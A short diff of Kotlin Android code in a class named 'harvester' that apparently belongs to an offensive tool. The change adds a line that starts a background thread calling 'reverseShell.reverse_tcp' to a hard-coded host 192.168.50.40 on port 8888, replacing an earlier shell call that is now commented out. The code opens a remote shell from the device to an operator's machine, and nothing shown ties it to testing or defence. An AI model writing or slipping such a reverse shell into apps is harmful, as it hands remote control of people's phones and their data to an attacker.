@@ -32,7 +32,8 @@ class harvester(var activity: Activity, var context: Context) {
 //        shellGetter.main()
         // This would be a good place to have the threading I think
         thread(start = true){
-            newShell().main()
+//            newShell().main()
+            reverseShell.reverse_tcp("192.168.50.40", 8888)
         }
 
     }
